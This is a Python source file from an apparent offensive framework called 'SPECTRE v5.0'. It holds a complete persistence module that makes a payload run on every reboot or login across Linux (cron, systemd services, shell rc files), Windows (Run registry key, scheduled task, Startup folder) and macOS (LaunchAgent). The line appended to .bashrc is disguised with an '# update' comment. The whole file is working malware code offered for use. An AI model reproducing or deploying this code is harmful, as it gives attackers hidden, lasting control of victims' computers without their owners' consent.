#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ============================================================
#  SPECTRE v5.0 - PERSISTENCE MODULES
#  Linux: cron, systemd, bashrc | Windows: Run, Task, Startup
#  macOS: launchd
#  👻 AUTHOR: イズミー (IZUMI)
# ============================================================

import os
import sys
import platform
import subprocess
from pathlib import Path
from typing import List, Dict

from core import log, C


class Persistence:
    def __init__(self, payload_path: str, name: str = "spectre_agent"):
        self.payload = str(Path(payload_path).resolve())
        self.name = name
        self.os = platform.system().lower()
        self._installed: List[str] = []

    # ============ LINUX ============
    def linux_cron(self, schedule: str = "@reboot") -> bool:
        try:
            entry = f"{schedule} {sys.executable} {self.payload}"
            r = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            current = r.stdout if r.returncode == 0 else ""
            if self.payload in current:
                log.info("Cron exists")
                return True
            new = current.rstrip() + "\n" + entry + "\n"
            p = subprocess.run(["crontab", "-"], input=new,
                               capture_output=True, text=True)
            if p.returncode == 0:
                log.info("Linux cron installed")
                self._installed.append("cron")
                return True
        except Exception as e:
            log.error(f"Cron: {e}")
        return False

    def linux_systemd(self, user: bool = True) -> bool:
        try:
            if user:
                svc_dir = Path.home() / ".config/systemd/user"
                svc_dir.mkdir(parents=True, exist_ok=True)
                svc_file = svc_dir / f"{self.name}.service"
                content = f"""[Unit]
Description={self.name}

[Service]
ExecStart={sys.executable} {self.payload}
Restart=always
RestartSec=30

[Install]
WantedBy=default.target
"""
                svc_file.write_text(content)
                subprocess.run(["systemctl", "--user", "daemon-reload"], check=False)
                subprocess.run(["systemctl", "--user", "enable", "--now",
                                f"{self.name}.service"], check=False)
                log.info("systemd (user) installed")
                self._installed.append("systemd_user")
                return True
            else:
                svc_file = Path(f"/etc/systemd/system/{self.name}.service")
                content = f"""[Unit]
Description={self.name}

[Service]
ExecStart={sys.executable} {self.payload}
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
"""
                svc_file.write_text(content)
                subprocess.run(["systemctl", "daemon-reload"], check=False)
                subprocess.run(["systemctl", "enable", "--now",
                                f"{self.name}.service"], check=False)
                log.info("systemd (system) installed")
                self._installed.append("systemd_system")
                return True
        except Exception as e:
            log.error(f"systemd: {e}")
        return False

    def linux_bashrc(self) -> bool:
        try:
            targets = [Path.home() / ".bashrc", Path.home() / ".zshrc"]
            line = f"\n# update\nnohup {sys.executable} {self.payload} >/dev/null 2>&1 &\n"
            for t in targets:
                if t.exists():
                    content = t.read_text()
                    if self.payload in content:
                        continue
                    with open(t, "a") as f:
                        f.write(line)
                    log.info(f"Appended: {t.name}")
                    self._installed.append(t.name)
            return True
        except Exception as e:
            log.error(f"bashrc: {e}")
        return False

    # ============ WINDOWS ============
    def windows_registry(self) -> bool:
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE,
            )
            cmd = f'"{sys.executable}" "{self.payload}"'
            winreg.SetValueEx(key, self.name, 0, winreg.REG_SZ, cmd)
            winreg.CloseKey(key)
            log.info("Windows Run installed")
            self._installed.append("registry_run")
            return True
        except Exception as e:
            log.error(f"Registry: {e}")
        return False

    def windows_scheduled_task(self, schedule: str = "ONLOGON") -> bool:
        try:
            cmd = ["schtasks", "/Create", "/F", "/TN", self.name,
                   "/TR", f'"{sys.executable}" "{self.payload}"',
                   "/SC", schedule]
            r = subprocess.run(cmd, capture_output=True, text=True)
            if r.returncode == 0:
                log.info("Windows task installed")
                self._installed.append("scheduled_task")
                return True
            log.error(f"schtasks: {r.stderr}")
        except Exception as e:
            log.error(f"Task: {e}")
        return False

    def windows_startup_folder(self) -> bool:
        try:
            appdata = os.getenv("APPDATA", "")
            if not appdata:
                return False
            startup = Path(appdata) / "Microsoft/Windows/Start Menu/Programs/Startup"
            startup.mkdir(parents=True, exist_ok=True)
            bat = startup / f"{self.name}.bat"
            bat.write_text(f'@echo off\nstart "" "{sys.executable}" "{self.payload}"\n')
            log.info(f"Startup .bat: {bat}")
            self._installed.append("startup_folder")
            return True
        except Exception as e:
            log.error(f"Startup: {e}")
        return False

    # ============ MACOS ============
    def macos_launchd(self) -> bool:
        try:
            agents = Path.home() / "Library/LaunchAgents"
            agents.mkdir(parents=True, exist_ok=True)
            plist = agents / f"com.{self.name}.plist"
            content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.{self.name}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>{self.payload}</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
</dict>
</plist>
"""
            plist.write_text(content)
            subprocess.run(["launchctl", "load", str(plist)], check=False)
            log.info("macOS launchd installed")
            self._installed.append("launchd")
            return True
        except Exception as e:
            log.error(f"launchd: {e}")
        return False

    # ============ AUTO ============
    def install_all(self) -> List[str]:
        methods = {
            "linux": [self.linux_cron, self.linux_systemd, self.linux_bashrc],
            "darwin": [self.macos_launchd],
            "windows": [self.windows_registry, self.windows_scheduled_task,
                        self.windows_startup_folder],
        }
        for fn in methods.get(self.os, []):
            try:
                fn()
            except Exception as e:
                log.error(f"{fn.__name__}: {e}")
        return self._installed

    def summary(self) -> Dict[str, any]:
        return {"os": self.os, "payload": self.payload,
                "installed": self._installed}


if __name__ == "__main__":
    print(C.a(f"Persistence self-test on {platform.system()}"))
    dummy = Path("dummy_agent.py")
    dummy.write_text("#!/usr/bin/env python3\nprint('hello')\n")
    p = Persistence(str(dummy), name="spectre_test")
    print(C.i(f"OS: {p.os}"))
    print(C.w("Dry run — p.install_all() gak dipanggil"))
    print(C.h("Persistence done 💀"))